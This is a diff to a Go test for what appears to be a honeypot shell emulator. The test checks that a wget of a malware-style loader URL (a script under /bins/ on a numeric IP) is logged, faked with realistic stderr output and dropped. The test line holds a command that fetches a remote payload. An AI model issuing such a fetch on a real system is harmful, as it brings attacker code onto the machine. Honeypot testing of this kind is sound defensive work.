@@ -10,12 +10,16 @@ func TestWgetRecordsAndDrops(t *testing.T) {
 	var got []Download
 	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
 	run(t, in, s, "cd /tmp")
-	out, _, st := run(t, in, s, "wget http://198.51.100.23/bins/x86.sh")
+	out, log, st := run(t, in, s, "wget http://198.51.100.23/bins/x86.sh")
 	if st != 0 {
 		t.Fatalf("wget status %d", st)
 	}
-	if !strings.Contains(out, "200 OK") || !strings.Contains(out, "saved") {
-		t.Errorf("wget output = %q", out)
+	// wget logs to stderr, and a numeric host is never "resolved".
+	if out != "" || !strings.Contains(log, "200 OK") || !strings.Contains(log, "saved") {
+		t.Errorf("wget stdout = %q, stderr = %q", out, log)
+	}
+	if strings.Contains(log, "Resolving") || !strings.Contains(log, "Connecting to 198.51.100.23:80... connected.") {
+		t.Errorf("wget with an IP address = %q", log)
 	}
 	if len(got) != 1 || got[0].URL != "http://198.51.100.23/bins/x86.sh" || got[0].Tool != "wget" {
 		t.Fatalf("download = %+v", got)
